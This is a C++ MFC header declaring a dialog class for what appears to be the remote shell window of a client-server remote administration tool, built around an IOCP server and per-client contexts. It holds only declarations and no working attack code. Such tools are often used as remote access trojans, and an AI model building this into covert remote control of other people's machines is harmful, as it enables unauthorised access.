#pragma once
#include "afxwin.h"
#include "stdafx.h"

// ShellDlg 对话框

class ShellDlg : public CDialogEx
{
	DECLARE_DYNAMIC(ShellDlg)

public:
	ShellDlg(CWnd* pParent = NULL,CIOCPServer* pIOCPServer = NULL, ClientContext *pContext = NULL);   // 标准构造函数
	virtual ~ShellDlg();

// 对话框数据
	enum { IDD = IDD_SHELLDLG };

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

	DECLARE_MESSAGE_MAP()
public:
	void OnReceiveComplete(void);
	CEdit m_edit;
	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
	UINT m_nCurSel;
	UINT m_nReceiveLength;
	afx_msg void OnSize(UINT nType, int cx, int cy);
	virtual BOOL OnInitDialog();
	afx_msg void OnChangeEdit();
	afx_msg HBRUSH OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor);
	virtual BOOL PreTranslateMessage(MSG* pMsg);
	void AddKeyBoardData();
};
